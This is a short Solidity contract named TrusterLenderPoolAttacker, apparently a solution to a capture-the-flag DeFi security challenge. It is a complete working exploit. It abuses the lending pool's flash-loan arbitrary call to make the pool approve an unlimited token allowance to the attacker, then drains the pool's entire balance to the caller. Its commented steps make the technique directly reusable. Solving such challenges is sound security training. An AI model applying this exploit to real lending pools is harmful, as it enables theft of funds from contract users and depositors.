// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {ITrusterLenderPool} from "./ITrusterLenderPool.sol";

contract TrusterLenderPoolAttacker {
    constructor(address _trusterLenderPool, address _token) {
        ITrusterLenderPool trusterLenderPool = ITrusterLenderPool(
            _trusterLenderPool
        );
        IERC20 token = IERC20(_token);
        // 1. Encode the call data that will set the desired token allowance for the pool-attacker (this contract) pair
        bytes memory data = abi.encodeCall(
            token.approve,
            (address(this), type(uint256).max)
        );
        // 2. Execute the flash loan
        trusterLenderPool.flashLoan(0, address(this), _token, data);
        // 3. Transfer all the tokens from the pool to the player
        token.transferFrom(
            _trusterLenderPool,
            msg.sender,
            token.balanceOf(_trusterLenderPool)
        );
    }
}
